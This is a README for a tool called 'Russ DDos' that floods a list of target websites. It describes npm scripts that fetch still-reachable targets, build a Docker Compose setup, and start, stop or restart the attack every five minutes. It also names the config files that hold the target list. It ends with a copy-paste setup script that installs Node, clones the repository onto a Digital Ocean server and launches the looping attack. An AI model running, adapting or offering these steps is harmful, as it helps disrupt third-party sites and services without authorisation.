#Russ DDos
Target sites can see in
https://ddosmonitor.herokuapp.com/

### Requirments
`Node (v17.6.0)`
`Docker Docker Compoose`
`Linux, Mac or WSL 2 (avaliability to run bash scripts)` 

### Scripts
`npm run service:generate` - generate docker-compose.yml. Based on request which will return still working target sites.

`npm run service:start` - start attack

`npm run service:forceKill` - stop attack, and clean all images

`npm run service:genStart` - generate new docker-compose.yml and start attack

`npm run startRestartServise` - restart DDos every 5 minutes

### Setup list of targets
`./constants/DDOS_TARGETS.js` file with list of targets

`./constants/DEFAULT_VALUES.js` ddos basic values


### Script for setup in Digital Ocean (Docker container)
`
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.38.0/install.sh | bash &&
source ~/.bashrc &&
nvm install 17 &&
nvm use 17 &&
git clone https://github.com/SergeyGuliy/russ_ddos.git &&
cd russ_ddos/ &&
chmod u+x bash/loop.sh &&
npm i &&
npm run startRestartServise
`